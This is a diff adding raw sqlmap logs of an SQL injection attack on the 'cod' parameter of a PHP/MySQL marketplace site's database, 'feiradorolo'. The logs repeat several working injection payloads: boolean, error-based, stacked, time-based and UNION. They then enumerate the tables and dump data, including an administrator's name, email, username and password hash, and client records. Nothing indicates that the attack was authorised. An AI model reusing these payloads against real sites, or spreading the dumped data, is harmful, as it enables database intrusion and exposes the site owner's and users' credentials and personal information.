@@ -1,0 +1,426 @@
+sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] feiradorolo
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+Database: feiradorolo
+[21 tables]
++---------------------+
+| banners             |
+| banners2013         |
+| bannersi            |
+| chat                |
+| cidades             |
+| cliente             |
+| clientes_boleto     |
+| configuracao        |
+| foto                |
+| fotos_anuncios      |
+| mural               |
+| noticias            |
+| online              |
+| perguntas           |
+| produtos            |
+| produtos_categorias |
+| produtos_sub        |
+| redessociais        |
+| texto               |
+| ticket              |
+| usuario             |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+Database: feiradorolo
+Table: usuario
+[1 entry]
++-----+---------------------+---------------------------------+----------------------------------+-----------+-----------+------------------+
+| obs | nome                | email                           | u3_senha                         | u1_codigo | u4_perfil | u2_usuario       |
++-----+---------------------+---------------------------------+----------------------------------+-----------+-----------+------------------+
+| .   | Elisadro Figueiredo | contato@feiradoroloavare.com.br | 4aa17af549deecaca5984c2fe645660d | 1         | <blank>   | grupofeiradorolo |
++-----+---------------------+---------------------------------+----------------------------------+-----------+-----------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+Database: feiradorolo
+Table: cliente
+[129 entries]
++------------+-------------------+
+| data       | descricao         |
++------------+-------------------+
+| 2017-11-08 | <blank>           |
+| 2017-11-21 | 2013619458871491  |
+| 2017-11-21 | 871196516349223   |
+| 2017-11-22 | <blank>           |
+| 2017-12-04 | 2037070843193019  |
+| 2017-12-12 | <blank>           |
+| 2017-12-15 | <blank>           |
+| 2017-12-16 | <blank>           |
+| 2017-12-18 | <blank>           |
+| 2017-12-18 | <blank>           |
+| 2017-12-18 | <blank>           |
+| 2017-12-19 | <blank>           |
+| 2017-12-20 | <blank>           |
+| 2017-12-20 | <blank>           |
+| 2017-12-21 | <blank>           |
+| 2017-12-21 | <blank>           |
+| 2017-12-22 | <blank>           |
+| 2017-12-22 | <blank>           |
+| 2017-12-22 | <blank>           |
+| 2017-12-23 | <blank>           |
+| 2017-12-25 | 2047116482188455  |
+| 2017-12-26 | 875940725910305   |
+| 2017-12-26 | 1988628034795457  |
+| 2017-12-27 | 1331243300354211  |
+| 2017-12-28 | <blank>           |
+| 2017-12-28 | <blank>           |
+| 2017-12-28 | 1754186317939229  |
+| 2017-12-29 | 1406141369512036  |
+| 2017-12-30 | 1546287898819186  |
+| 2018-01-02 | 10213970905054040 |
+| 2018-01-08 | 1539260546108982  |
+| 2018-01-10 | <blank>           |
+| 2018-01-10 | 171736246914784   |
+| 2018-01-11 | <blank>           |
+| 2018-01-12 | <blank>           |
+| 2018-01-12 | <blank>           |
+| 2018-01-13 | <blank>           |
+| 2018-01-16 | <blank>           |
+| 2018-01-17 | <blank>           |
+| 2018-01-18 | <blank>           |
+| 2018-01-18 | <blank>           |
+| 2018-01-19 | <blank>           |
+| 2018-01-19 | <blank>           |
+| 2018-01-22 | <blank>           |
+| 2018-01-22 | <blank>           |
+| 2018-01-23 | <blank>           |
+| 2018-01-24 | 1635719623156123  |
+| 2018-01-24 | 1568592166551286  |
+| 2018-01-25 | 1218549234945670  |
+| 2018-01-25 | <blank>           |
+| 2018-01-26 | <blank>           |
+| 2018-01-26 | <blank>           |
+| 2018-01-29 | <blank>           |
+| 2018-01-30 | <blank>           |
+| 2018-01-30 | <blank>           |
+| 2018-01-31 | <blank>           |
+| 2018-01-31 | <blank>           |
+| 2018-01-31 | 1612272108859836  |
+| 2018-01-31 | 343343952831876   |
+| 2018-02-01 | <blank>           |
+| 2018-02-11 | 2037435843166522  |
+| 2018-02-12 | <blank>           |
+| 2018-02-12 | 1954932244798164  |
+| 2018-02-14 | 2104330353129266  |
+| 2018-02-19 | 1615867645167185  |
+| 2018-02-20 | 483467082049368   |
+| 2018-02-22 | 153127268639644   |
+| 2018-02-25 | 1105002186309696  |
+| 2018-02-27 | 2010018892598784  |
+| 2018-02-28 | 2010625792538094  |
+| 2018-03-02 | 408818812887902   |
+| 2018-03-06 | 10155181677311440 |
+| 2018-03-22 | <blank>           |
+| 2018-03-25 | 2004320569807923  |
+| 2018-03-27 | <blank>           |
+| 2018-03-28 | <blank>           |
+| 2018-04-01 | 571037943263317   |
+| 2018-04-05 | <blank>           |
+| 2018-04-07 | 974998122666502   |
+| 2018-04-07 | <blank>           |
+| 2018-04-08 | <blank>           |
+| 2018-04-10 | <blank>           |
+| 2018-04-14 | <blank>           |
+| 2018-04-19 | 1009372192573366  |
+| 2018-04-20 | <blank>           |
+| 2018-04-22 | 1795527093847361  |
+| 2018-04-22 | 2036946486572691  |
+| 2018-04-23 | 1911261795565317  |
+| 2018-04-23 | 1758393867533147  |
+| 2018-05-04 | 1949261081814847  |
+| 2018-05-05 | 142883976566402   |
+| 2018-05-06 | 847740118762393   |
+| 2018-05-10 | <blank>           |
+| 2018-05-11 | 251617022245159   |
+| 2018-05-16 | 10210950814438220 |
+| 2018-05-18 | 1577490755681993  |
+| 2018-05-19 | 1260855010714965  |
+| 2018-05-24 | <blank>           |
+| 2018-06-03 | 2086016861685631  |
+| 2018-06-10 | 1740315136047258  |
+| 2018-06-12 | <blank>           |
+| 2018-06-14 | <blank>           |
+| 2018-06-18 | <blank>           |
+| 2018-06-18 | <blank>           |
+| 2018-06-20 | <blank>           |
+| 2018-06-22 | <blank>           |
+| 2018-06-22 | 1659810117401490  |
+| 2018-06-23 | <blank>           |
+| 2018-06-25 | <blank>           |
+| 2018-06-25 | <blank>           |
+| 2018-06-26 | <blank>           |
+| 2018-06-27 | <blank>           |
+| 2018-06-27 | <blank>           |
+| 2018-07-02 | <blank>           |
+| 2018-07-05 | <blank>           |
+| 2018-07-05 | 241939236586557   |
+| 2018-07-06 | <blank>           |
+| 2018-07-09 | 112964152956059   |
+| 2018-07-10 | <blank>           |
+| 2018-07-10 | <blank>           |
+| 2018-07-12 | <blank>           |
+| 2018-07-12 | 900016276846937   |
+| 2018-07-12 | <blank>           |
+| 2018-07-16 | <blank>           |
+| 2018-07-17 | <blank>           |
+| 2018-07-18 | <blank>           |
+| 2018-07-23 | <blank>           |
+| 2018-07-25 | <blank>           |
+| 2018-07-28 | <blank>           |
++------------+-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+Database: feiradorolo
+Table: cliente
+[52 entries]
++---------+---------+-------+
+| cpf     | email   | senha |
++---------+---------+-------+
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
+| <blank> | <blank> | 0     |
++---------+---------+-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1752 AND 1515=1515
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=1752 AND (SELECT 3044 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(3044=3044,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: cod=1752;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1752 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 22 columns
+    Payload: cod=-9318 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7a56746a777a6d4c72426e74774e445866796c675554684c4444635166654648527863626d755441,0x7171627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DjdP
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0
+Database: feiradorolo
+Table: cliente
+[2 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| data      | date     |
+| descricao | longtext |
++-----------+----------+
+
